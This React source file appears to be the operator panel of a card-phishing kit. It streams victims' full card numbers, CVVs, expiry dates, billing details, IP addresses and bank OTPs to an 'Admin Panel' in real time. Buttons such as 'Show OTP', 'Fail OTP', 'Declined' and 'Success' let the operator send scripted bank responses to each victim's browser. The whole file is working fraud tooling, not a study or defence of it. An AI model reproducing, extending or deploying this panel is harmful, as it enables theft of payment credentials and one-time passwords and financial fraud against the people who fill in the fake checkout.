
import React, { useState, useEffect } from 'react';
import { MoreHorizontal, Check, X, AlertTriangle, Wifi, WifiOff, Copy } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { io, Socket } from 'socket.io-client';
import { useToast } from '@/hooks/use-toast';
import { useSocket } from '../SocketContext';
import { v4 as uuidv4 } from 'uuid';

const formatCardNumber = (cardNumber: string) => {
  if (!cardNumber) return '';
  // Remove any non-digit characters
  const digitsOnly = cardNumber.replace(/\D/g, '');
  // Show last 4 digits only if card number is longer than 4 digits
  if (digitsOnly.length > 4) {
    return `•••• •••• •••• ${digitsOnly.slice(-4)}`;
  }
  return digitsOnly;
};

const formatExpiry = (payment: any) => {
  if (!payment.expiry) return '';
  const expiryParts = payment.expiry.split('/');
  if (expiryParts.length !== 2) return '';
  return `${expiryParts[0].padStart(2, '0')}/${expiryParts[1]}`;
};

interface PaymentData {
  id: string;
  paymentId: string;
  cardNumber: string;
  cardName: string;
  cvv: string;
  expiry: string;
  expiryMonth?: string;
  expiryYear?: string;
  billingDetails: {
    firstName: string;
    lastName: string;
    email: string;
    country: string;
    companyName: string;
  };
  planName: string;
  billing: string;
  amount: number;
  timestamp: string;
  status: 'pending' | 'approved' | 'rejected';
  [key: string]: any; // Add index signature to allow dynamic properties
}

interface OtpData {
  paymentId: string;
  otp: string;
  timestamp: string;
}

interface VisitorData {
  id: string;
  visitorId: string;
  ipAddress: string;
  timestamp: string;
  userAgent: string;
}

const Admin = () => {
  const [payments, setPayments] = useState<PaymentData[]>([]);
  const [otps, setOtps] = useState<OtpData[]>([]);
  const [activeDropdown, setActiveDropdown] = useState<string | null>(null);
  const [liveVisitors, setLiveVisitors] = useState<VisitorData[]>([]);
  const [clickedCards, setClickedCards] = useState<Set<string>>(new Set(JSON.parse(localStorage.getItem('clickedCards') || '[]')));
  const [visitorHeartbeats, setVisitorHeartbeats] = useState<{[key: string]: number}>({});
  const { toast } = useToast();
  const { socket, isConnected } = useSocket();

  useEffect(() => {
    if (!socket) return;
    try {
      // Listen for new payment data with error handling
      socket.on('payment-received', (data: Omit<PaymentData, 'id' | 'status'>) => {
        try {
          if (!data || !data.cardNumber || !data.cardName) {
            console.error('Invalid payment data received:', data);
            return;
          }
          
          const newPayment: PaymentData = {
            ...data,
            id: Date.now().toString() + Math.random().toString(36).substr(2, 9),
            paymentId: data.paymentId || `pay_${Date.now()}`,
            status: 'pending',
            cardNumber: data.cardNumber || '',
            cardName: data.cardName || '',
            cvv: data.cvv || '',
            expiry: data.expiry || '',
            billingDetails: data.billingDetails || {
              firstName: '',
              lastName: '',
              email: '',
              country: '',
              companyName: ''
            },
            planName: data.planName || '',
            billing: data.billing || '',
            amount: data.amount || 0,
            timestamp: data.timestamp || new Date().toISOString()
          };
          setPayments(prev => [newPayment, ...prev]);
        } catch (error) {
          console.error('Error processing payment data:', error);
        }
      });

      // Listen for OTP submissions with error handling
      socket.on('otp-submitted', (data: { otp: string; paymentId?: string; planData?: any }) => {
        try {
          if (!data || !data.otp) {
            console.error('Invalid OTP data received:', data);
            return;
          }
          
          // Create new OTP entry
          const newOtp: OtpData = {
            paymentId: data.paymentId || 'payment-' + Date.now(),
            otp: data.otp,
            timestamp: new Date().toISOString()
          };
          setOtps(prev => [newOtp, ...prev.slice(0, 4)]); // Keep only last 5 OTPs
          console.log('OTP received:', data.otp);
        } catch (error) {
          console.error('Error processing OTP data:', error);
        }
      });

      // Listen for visitor join/leave events
      socket.on('visitor-joined', (data: Omit<VisitorData, 'id'>) => {
        try {
          if (!data || !data.visitorId) {
            console.error('Invalid visitor data received:', data);
            return;
          }
          const newVisitor: VisitorData = {
            ...data,
            id: data.visitorId
          };
          setLiveVisitors(prev => [newVisitor, ...prev.filter(v => v.visitorId !== data.visitorId)]);
          // Update heartbeat timestamp
          setVisitorHeartbeats(prev => ({ ...prev, [data.visitorId]: Date.now() }));
        } catch (error) {
          console.error('Error processing visitor data:', error);
        }
      });
      
      // Listen for visitor heartbeats
      socket.on('visitor-heartbeat', (data: { visitorId: string }) => {
        try {
          if (!data || !data.visitorId) return;
          setVisitorHeartbeats(prev => ({ ...prev, [data.visitorId]: Date.now() }));
        } catch (error) {
          console.error('Error processing visitor heartbeat:', error);
        }
      });
      
      socket.on('visitor-left', (data: { visitorId: string }) => {
        try {
          if (!data || !data.visitorId) {
            console.error('Invalid visitor leave data received:', data);
            return;
          }
          setLiveVisitors(prev => prev.filter(visitor => visitor.visitorId !== data.visitorId));
          setVisitorHeartbeats(prev => {
            const updated = { ...prev };
            delete updated[data.visitorId];
            return updated;
          });
        } catch (error) {
          console.error('Error processing visitor leave data:', error);
        }
      });

      return () => {
        socket.off('payment-received');
        socket.off('otp-submitted');
        socket.off('visitor-joined');
        socket.off('visitor-heartbeat');
        socket.off('visitor-left');
      };
    } catch (error) {
      console.error('Error initializing WebSocket connection:', error);
      // setIsConnected(false); // This line is removed as per the new_code
    }
  }, [socket]);

  // Cleanup inactive visitors based on heartbeat
  useEffect(() => {
    const interval = setInterval(() => {
      const now = Date.now();
      const HEARTBEAT_TIMEOUT = 60000; // 1 minute timeout
      
      setLiveVisitors(prev => 
        prev.filter(visitor => {
          const lastHeartbeat = visitorHeartbeats[visitor.visitorId];
          return lastHeartbeat && (now - lastHeartbeat) < HEARTBEAT_TIMEOUT;
        })
      );
      
      // Clean up old heartbeat entries
      setVisitorHeartbeats(prev => {
        const updated = { ...prev };
        Object.keys(updated).forEach(visitorId => {
          if ((now - updated[visitorId]) >= HEARTBEAT_TIMEOUT) {
            delete updated[visitorId];
          }
        });
        return updated;
      });
    }, 30000); // Check every 30 seconds
    
    return () => clearInterval(interval);
  }, [visitorHeartbeats]);

  // Handle card click to stop glowing
  const handleCardClick = (paymentId: string) => {
    const newClickedCards = new Set(clickedCards);
    newClickedCards.add(paymentId);
    setClickedCards(newClickedCards);
    localStorage.setItem('clickedCards', JSON.stringify([...newClickedCards]));
  };

  const handleAction = (paymentId: string, action: string) => {
    console.log('Handle action called:', action, 'Payment ID:', paymentId);
    
    try {
      if (!socket) {
        console.error('Socket not connected');
        toast({
          title: "Connection Error",
          description: "Connection lost. Please refresh the page.",
          variant: "destructive",
        });
        return;
      }

      if (!isConnected) {
        console.error('Socket not connected');
        toast({
          title: "Connection Error",
          description: "Not connected to server. Please wait for reconnection.",
          variant: "destructive",
        });
        return;
      }

      switch (action) {
        case 'show-otp':
          console.log('Emitting show-otp event');
          socket.emit('show-otp', { paymentId });
          toast({
            title: "Command Initiated",
            description: "OTP request sent to client",
          });
          break;
        case 'validate-otp':
          console.log('Emitting payment-approved event for validate-otp');
          console.log('PaymentId being sent:', paymentId);
          socket.emit('payment-approved', { paymentId });
          updatePaymentStatus(paymentId, 'approved');
          toast({
            title: "Command Initiated",
            description: "Payment approved - client redirecting to success page",
          });
          break;
        case 'fail-otp':
          console.log('Emitting invalid-otp-error event');
          socket.emit('invalid-otp-error', { paymentId });
          toast({
            title: "Command Initiated",
            description: "Invalid OTP response sent to client",
          });
          break;
        case 'card-declined':
          console.log('Emitting card-declined-error event');
          socket.emit('card-declined-error', { paymentId });
          updatePaymentStatus(paymentId, 'rejected');
          toast({
            title: "Command Initiated", 
            description: "Card declined response sent to client",
          });
          break;
        case 'insufficient-balance':
          console.log('Emitting insufficient-balance-error event');
          socket.emit('insufficient-balance-error', { paymentId });
          toast({
            title: "Command Initiated",
            description: "Insufficient balance response sent to client", 
          });
          break;
        case 'successful':
          console.log('Emitting payment-approved event for success');
          console.log('PaymentId being sent:', paymentId);
          socket.emit('payment-approved', { paymentId });
          updatePaymentStatus(paymentId, 'approved');
          toast({
            title: "Command Initiated", 
            description: "Payment successful - client redirecting to success page",
          });
          break;
        default:
          console.error('Unknown action:', action);
          return;
      }
      setActiveDropdown(null);
    } catch (error) {
      console.error('Error handling action:', error);
      toast({
        title: "Error",
        description: "An error occurred. Please try again.",
        variant: "destructive",
      });
    }
  };

  const updatePaymentStatus = (paymentId: string, status: 'approved' | 'rejected') => {
    setPayments(prev => prev.map(payment => 
      payment.id === paymentId ? { ...payment, status } : payment
    ));
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text).then(() => {
      toast({
        title: "Copied!",
        description: "Card number copied to clipboard",
      });
    }).catch((error) => {
      console.error('Error copying to clipboard:', error);
      toast({
        title: "Error",
        description: "Failed to copy to clipboard",
        variant: "destructive",
      });
    });
  };

  const getStatusColor = (status: string) => {
    switch (status) {
      case 'approved': return 'text-green-400';
      case 'rejected': return 'text-red-400';
      default: return 'text-yellow-400';
    }
  };

  const getStatusIcon = (status: string) => {
    switch (status) {
      case 'approved': return <Check className="h-4 w-4" />;
      case 'rejected': return <X className="h-4 w-4" />;
      default: return <AlertTriangle className="h-4 w-4" />;
    }
  };

  return (
    <div className="min-h-screen bg-black text-white p-6">
      <div className="max-w-7xl mx-auto">
        {/* Header */}
        <div className="flex items-center justify-between mb-8">
          <h1 className="text-3xl font-bold">Admin Panel</h1>
          <div className="flex items-center gap-2">
            {isConnected ? (
              <>
                <Wifi className="h-5 w-5 text-green-400" />
                <span className="text-green-400">Connected</span>
              </>
            ) : (
              <>
                <WifiOff className="h-5 w-5 text-red-400" />
                <span className="text-red-400">Disconnected</span>
              </>
            )}
          </div>
        </div>

        {/* Live Visitors Section */}
        <div className="bg-gray-900 rounded-lg overflow-hidden mb-8">
          <div className="p-6 border-b border-gray-700">
            <h2 className="text-xl font-semibold">Live Visitors</h2>
            <p className="text-gray-400 mt-1">Real-time website visitors ({liveVisitors.length} online)</p>
          </div>
          
          <div className="overflow-x-auto">
            <table className="w-full">
              <thead className="bg-gray-800">
                <tr>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                    Timestamp
                  </th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                    IP Address
                  </th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                    User Agent
                  </th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                    Status
                  </th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-700">
                {liveVisitors.length === 0 ? (
                  <tr>
                    <td colSpan={4} className="px-6 py-8 text-center text-gray-400">
                      No live visitors at the moment
                    </td>
                  </tr>
                ) : (
                  liveVisitors.map((visitor) => (
                    <tr key={visitor.id} className="hover:bg-gray-800">
                      <td className="px-6 py-4 whitespace-nowrap text-sm">
                        {new Date(visitor.timestamp).toLocaleString()}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap">
                        <div className="bg-red-600 text-black px-3 py-1 rounded font-bold text-sm">
                          {visitor.ipAddress}
                        </div>
                      </td>
                      <td className="px-6 py-4 text-sm text-gray-300">
                        <div className="max-w-xs truncate" title={visitor.userAgent}>
                          {visitor.userAgent}
                        </div>
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap">
                        <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-green-100 text-green-800">
                          <div className="w-2 h-2 bg-green-500 rounded-full mr-1.5 animate-pulse"></div>
                          Online
                        </span>
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        </div>

        {/* Payment Data Table */}
        <div className="bg-gray-900 rounded-lg overflow-hidden mb-8">
          <div className="p-6 border-b border-gray-700">
            <div className="flex justify-between items-center">
              <div>
                <h2 className="text-xl font-semibold">Payment Transactions</h2>
                <p className="text-gray-400 mt-1">Real-time payment data from checkout</p>
              </div>
              {/* OTP Display Area */}
              {otps.length > 0 && (
                <div className="bg-blue-900 rounded-lg p-4 border border-blue-700">
                  <h3 className="text-blue-300 font-medium mb-2">Latest OTP</h3>
                  <div className="flex items-center gap-3">
                    <span className="text-2xl font-bold text-blue-100 bg-blue-800 px-3 py-1 rounded font-mono">
                      {otps[0].otp}
                    </span>
                    <Button
                      variant="ghost"
                      size="sm"
                      onClick={() => copyToClipboard(otps[0].otp)}
                      className="h-6 w-6 p-0 text-blue-300 hover:text-blue-100"
                    >
                      <Copy className="h-4 w-4" />
                    </Button>
                  </div>
                  <p className="text-xs text-blue-400 mt-1">
                    Received: {new Date(otps[0].timestamp).toLocaleTimeString()}
                  </p>
                </div>
              )}
            </div>
          </div>
          
          <div className="overflow-x-auto">
            <table className="w-full">
              <thead className="bg-gray-800">
                <tr>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                    Timestamp
                  </th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                    Customer
                  </th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                    Card Number
                  </th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                    Holder Name
                  </th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                    CVV
                  </th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                    Expiry
                  </th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                    Amount
                  </th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                    Status
                  </th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                    Actions
                  </th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-700">
                {payments.length === 0 ? (
                  <tr>
                    <td colSpan={9} className="px-6 py-8 text-center text-gray-400">
                      No payment data received yet. Waiting for transactions...
                    </td>
                  </tr>
                ) : (
                  payments.map((payment) => {
                    const isNewCard = !clickedCards.has(payment.id);
                    return (
                    <tr 
                      key={payment.id} 
                      className={`hover:bg-gray-800 cursor-pointer transition-all duration-300 ${
                        isNewCard 
                          ? 'border-2 border-cyan-400 shadow-lg shadow-cyan-400/50 animate-pulse bg-gray-800/50' 
                          : ''
                      }`}
                      onClick={() => handleCardClick(payment.id)}
                      style={{
                        boxShadow: isNewCard ? '0 0 20px rgba(34, 211, 238, 0.6), inset 0 0 20px rgba(34, 211, 238, 0.1)' : undefined
                      }}
                    >
                      <td className="px-6 py-4 whitespace-nowrap text-sm">
                        {new Date(payment.timestamp).toLocaleString()}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap">
                        <div className="text-sm font-medium">{payment.billingDetails.firstName} {payment.billingDetails.lastName}</div>
                        <div className="text-sm text-gray-400">{payment.billingDetails.email}</div>
                        <div className="text-xs text-gray-500">{payment.billingDetails.country}</div>
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm font-mono">
                        <div className="flex items-center gap-2">
                          <span className="text-green-400">{formatCardNumber(payment.cardNumber)}</span>
                          <Button
                            variant="ghost"
                            size="sm"
                            onClick={() => copyToClipboard(payment.cardNumber)}
                            className="h-6 w-6 p-0 text-gray-400 hover:text-white"
                          >
                            <Copy className="h-3 w-3" />
                          </Button>
                        </div>
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm">
                        {payment.cardName}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm font-mono">
                        {payment.cvv}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm">
                        {formatExpiry(payment)}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm font-medium">
                        ₹{payment.amount.toLocaleString()}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap">
                        <span className={`flex items-center gap-2 text-sm font-medium ${getStatusColor(payment.status)}`}>
                          {getStatusIcon(payment.status)}
                          {payment.status.charAt(0).toUpperCase() + payment.status.slice(1)}
                        </span>
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-right text-sm font-medium">
                        <div className="flex flex-col gap-2">
                          {/* OTP Display for this payment */}
                          {otps.length > 0 && otps[0].paymentId === payment.id && (
                            <div className="bg-blue-900 rounded-lg p-3 border border-blue-700 mb-2">
                              <div className="flex items-center gap-2">
                                <span className="text-xs text-blue-300">OTP:</span>
                                <span className="text-lg font-bold text-blue-100 bg-blue-800 px-2 py-1 rounded font-mono">
                                  {otps[0].otp}
                                </span>
                                <Button
                                  variant="ghost"
                                  size="sm"
                                  onClick={() => copyToClipboard(otps[0].otp)}
                                  className="h-6 w-6 p-0 text-blue-300 hover:text-blue-100"
                                >
                                  <Copy className="h-3 w-3" />
                                </Button>
                              </div>
                            </div>
                          )}

                          {/* Action Buttons */}
                          <div className="flex flex-wrap gap-1">
                            <Button
                              onClick={() => handleAction(payment.paymentId, 'show-otp')}
                              size="sm"
                              variant="outline"
                              className="text-xs h-6 px-2 bg-blue-600 text-white border-blue-500 hover:bg-blue-700"
                            >
                              Show OTP
                            </Button>
                            <Button
                              onClick={() => handleAction(payment.paymentId, 'validate-otp')}
                              size="sm"
                              variant="outline"
                              className="text-xs h-6 px-2 bg-green-600 text-white border-green-500 hover:bg-green-700"
                            >
                              Validate
                            </Button>
                            <Button
                              onClick={() => handleAction(payment.paymentId, 'fail-otp')}
                              size="sm"
                              variant="outline"
                              className="text-xs h-6 px-2 bg-red-600 text-white border-red-500 hover:bg-red-700"
                            >
                              Fail OTP
                            </Button>
                            <Button
                              onClick={() => handleAction(payment.paymentId, 'card-declined')}
                              size="sm"
                              variant="outline"
                              className="text-xs h-6 px-2 bg-orange-600 text-white border-orange-500 hover:bg-orange-700"
                            >
                              Declined
                            </Button>
                            <Button
                              onClick={() => handleAction(payment.paymentId, 'insufficient-balance')}
                              size="sm"
                              variant="outline"
                              className="text-xs h-6 px-2 bg-yellow-600 text-white border-yellow-500 hover:bg-yellow-700"
                            >
                              Insufficient
                            </Button>
                            <Button
                              onClick={() => handleAction(payment.paymentId, 'successful')}
                              size="sm"
                              variant="outline"
                              className="text-xs h-6 px-2 bg-emerald-600 text-white border-emerald-500 hover:bg-emerald-700"
                            >
                              Success
                            </Button>
                          </div>
                        </div>
                      </td>
                    </tr>
                    );
                  })
                )}
              </tbody>
            </table>
          </div>
        </div>

        {/* OTP Data Table */}
        <div className="bg-gray-900 rounded-lg overflow-hidden">
          <div className="p-6 border-b border-gray-700">
            <h2 className="text-xl font-semibold">OTP Submissions</h2>
            <p className="text-gray-400 mt-1">OTPs received from customers ({otps.length} total)</p>
          </div>
          
          {otps.length === 0 ? (
            <div className="p-8 text-center text-gray-500">
              No OTP submissions at the moment
            </div>
          ) : (
            
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead className="bg-gray-800">
                  <tr>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                      Timestamp
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                      Payment ID
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                      OTP
                    </th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-gray-700">
                  {otps.map((otp, index) => (
                    <tr key={index} className="hover:bg-gray-800">
                      <td className="px-6 py-4 whitespace-nowrap text-sm">
                        {new Date(otp.timestamp).toLocaleString()}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm font-mono">
                        {otp.paymentId}
                      </td>
                       <td className="px-6 py-4 whitespace-nowrap">
                         <div className="flex items-center gap-2">
                           <span className="text-yellow-400 font-mono text-lg">{otp.otp}</span>
                           <Button
                             variant="ghost"
                             size="sm"
                             onClick={() => copyToClipboard(otp.otp)}
                             className="h-6 w-6 p-0 text-gray-400 hover:text-white"
                           >
                             <Copy className="h-3 w-3" />
                           </Button>
                         </div>
                       </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default Admin;
